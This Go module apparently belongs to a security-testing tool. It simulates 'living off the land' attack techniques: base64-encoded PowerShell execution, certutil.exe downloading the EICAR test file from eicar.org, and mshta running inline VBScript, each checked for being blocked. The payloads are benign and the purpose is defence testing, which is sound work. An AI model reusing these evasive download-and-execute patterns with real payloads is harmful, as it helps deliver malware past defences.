package modules

import (
	"agentide/core"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"time"
)

type lolbinModule struct{ logger *core.Logger }

func (m *lolbinModule) Name() string { return "lolbin" }

func (m *lolbinModule) Run() RawResult {
	result := RawResult{
		ModuleName: m.Name(),
		MitreID:    "T1059.001",
		Action:     "Execute LOLBin techniques: encoded PowerShell, certutil downloader",
	}

	start := time.Now()
	notes := []string{}
	anyBlocked := false

	// ── 1. Base64-encoded PowerShell ──────────────────────────────────────
	// Encodes: Write-Output "AgentIde LOLBin Test"
	encoded := "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAZwBlAG4AdABJAGQAZQAgAEwATwBMAEIAaQBuACAAVABlAHMAdAAi"
	m.logger.Info("LOLBin: encoded PowerShell", map[string]interface{}{"encoded": encoded})
	blocked, note := runCommand("powershell.exe", "-NoProfile", "-NonInteractive", "-EncodedCommand", encoded)
	notes = append(notes, "EncodedPS: "+note)
	if blocked {
		anyBlocked = true
	}

	// ── 2. certutil downloader ─────────────────────────────────────────────
	outFile := filepath.Join(os.TempDir(), "agentide_certutil_test.txt")
	m.logger.Info("LOLBin: certutil download", map[string]interface{}{"url": "http://www.eicar.org/download/eicar.com.txt"})
	blocked, note = runCommand("certutil.exe", "-urlcache", "-f", "http://www.eicar.org/download/eicar.com.txt", outFile)
	notes = append(notes, "Certutil: "+note)
	if blocked {
		anyBlocked = true
	}
	globalLedger.Record("file", outFile, nil)

	// ── 3. mshta with a benign inline script ──────────────────────────────
	m.logger.Info("LOLBin: mshta execution", nil)
	blocked, note = runCommand("mshta.exe", "vbscript:Close")
	notes = append(notes, "mshta: "+note)
	if blocked {
		anyBlocked = true
	}

	result.OSFeedback.AccessDenied = anyBlocked
	result.OSFeedback.ProcessKilled = anyBlocked
	result.ElapsedMs = time.Since(start).Milliseconds()
	result.Notes = joinNotes(notes)
	return result
}

// runCommand executes a command and returns whether it was blocked and a note.
func runCommand(name string, args ...string) (blocked bool, note string) {
	cmd := exec.Command(name, args...)
	err := cmd.Run()
	if err != nil {
		return true, fmt.Sprintf("blocked (%v)", err)
	}
	return false, "allowed"
}
